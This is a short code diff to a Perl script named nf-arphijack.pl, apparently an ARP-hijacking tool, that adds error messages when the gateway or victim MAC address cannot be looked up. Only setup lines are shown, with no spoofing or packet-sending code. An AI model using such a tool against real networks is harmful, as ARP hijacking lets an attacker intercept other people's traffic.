@@ -1,6 +1,6 @@
 #!/usr/bin/perl
 #
-# $Id: nf-arphijack.pl,v 1.2 2006/12/04 21:20:34 gomor Exp $
+# $Id: nf-arphijack.pl,v 1.3 2006/12/05 20:47:32 gomor Exp $
 #
 use strict;
 use warnings;
@@ -29,8 +29,10 @@ use Net::Write::Layer2;
 
 my $oDevice = Net::Frame::Device->new(target => $opts{v});
 
-my $macGateway = $opts{G} || $oDevice->lookupMac($opts{g});
-my $macVictim  = $opts{V} || $oDevice->lookupMac($opts{v});
+my $macGateway = $opts{G} || $oDevice->lookupMac($opts{g})
+   || die("Cannot lookup gateway MAC\n");
+my $macVictim  = $opts{V} || $oDevice->lookupMac($opts{v})
+   || die("Cannot lookup victim MAC\n");
 my $ipGateway  = $opts{g};
 my $ipVictim   = $opts{v};
 
